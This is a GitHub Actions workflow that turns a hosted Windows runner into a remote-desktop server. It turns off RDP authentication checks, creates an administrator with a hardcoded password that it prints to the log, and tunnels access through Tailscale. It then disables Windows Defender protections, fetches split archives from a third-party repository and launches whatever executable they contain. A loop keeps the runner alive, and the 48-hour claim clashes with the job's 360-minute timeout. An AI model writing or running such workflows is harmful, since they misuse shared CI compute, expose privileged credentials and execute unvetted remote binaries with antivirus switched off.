name: Windows Cloud RDP

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - name: 1. Enable Remote Desktop & Firewall
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0

      - name: 2. Create Admin Account
        run: |
          $Password = ConvertTo-SecureString "P@ssw0rd1qazXSW@#" -AsPlainText -Force
          New-LocalUser -Name "NvDAdmin" -Password $Password -PasswordNeverExpires -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Administrators" -Member "NvDAdmin" -ErrorAction SilentlyContinue
          net user runneradmin P@ssw0rd1qazXSW@#

      - name: 3. Install & Connect Tailscale VPN
        env:
          TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
        run: |
          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\tailscale.msi"
          Start-Process msiexec -ArgumentList "/i C:\tailscale.msi /quiet /norestart" -Wait
          Start-Sleep -Seconds 5
          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$Env:TAILSCALE_AUTHKEY" --hostname="github-rdp-server"
          Start-Sleep -Seconds 8
          $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
          Write-Host "==================================================" -ForegroundColor Green
          Write-Host "  Tailscale IP : $ts_ip" -ForegroundColor Yellow
          Write-Host "  Username     : NvdAdmin" -ForegroundColor Yellow
          Write-Host "  Password     : P@ssw0rd1qazXSW@#" -ForegroundColor Yellow
          Write-Host "==================================================" -ForegroundColor Green

      - name: 4. Deploy and Execute Application
        shell: powershell
        run: |
          # 1. Define a Fixed Work Directory (Avoids User Profile issues)
          $workDir = "C:\app_deploy"
          $downloadDir = "$workDir\downloads"
          
          # Clean up previous attempts
          if (Test-Path $workDir) { Remove-Item -Recurse -Force $workDir -ErrorAction SilentlyContinue }
          New-Item -ItemType Directory -Path $downloadDir -Force | Out-Null
          
          # 2. Disable Security (Defender & SmartScreen)
          Write-Host "Disabling Windows Defender..." -ForegroundColor Cyan
          Set-MpPreference -DisableRealtimeMonitoring $true
          Set-MpPreference -DisableIOAVProtection $true
          Set-MpPreference -DisableBehaviorMonitoring $true
          Set-MpPreference -DisableScriptScanning $true

          # 3. Download Split Zip Files (Direct Raw Links)
          $filesToDownload = @(
            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z01",
            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z02",
            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z03",
            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.zip"
          )

          foreach ($url in $filesToDownload) {
              $fileName = Split-Path $url -Leaf
              Write-Host "Downloading $fileName..." -ForegroundColor Yellow
              Invoke-WebRequest -Uri $url -OutFile "$downloadDir\$fileName"
          }

          # 4. Robust Extraction using 7-Zip
          # We use 7-Zip to handle the split volumes correctly.
          Write-Host "Extracting archive using 7-Zip..." -ForegroundColor Cyan
          & "C:\Program Files\7-Zip\7z.exe" x "$downloadDir\multinl_zip.zip" -o"$workDir" -y

          # 5. Find the Executable (Deep Search)
          # Instead of hardcoding a path that might fail, we search the entire C:\app_deploy folder
          Write-Host "Searching for application executable..." -ForegroundColor Cyan
          Start-Sleep -Seconds 5
          
          $exeFile = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1

          if ($exeFile) {
              $exePath = $exeFile.FullName
              $exeDir = Split-Path $exePath -Parent
              Write-Host "SUCCESS: Found application at $exePath" -ForegroundColor Green
              Write-Host "Launching from directory: $exeDir" -ForegroundColor Yellow
              
              # 6. Final Execution
              # We set the working directory to the EXE's folder so it finds its DLLs
              Set-ExecutionPolicy Bypass -Scope Process -Force
              
              # Launch the app in a way that doesn't block the workflow
              Start-Process -FilePath $exePath -WorkingDirectory $exeDir -WindowStyle Normal
              Write-Host "Application process started." -ForegroundColor Green
          } else {
              Write-Host "CRITICAL ERROR: Could not find any .exe after extraction." -ForegroundColor Red
              # Log everything to help debugging
              Get-ChildItem -Path $workDir -Recurse | Select-Object FullName | Out-File "$workDir\debug_files.txt"
              Write-Host "File structure logged to $workDir\debug_files.txt"
          }

      - name: 5. Keep Server Alive (48 Hours)
        run: |
          for ($i = 1; $i -le 2880; $i++) {
            Start-Sleep -Seconds 60
            Write-Host "[$i/2880] Server running..."
          }
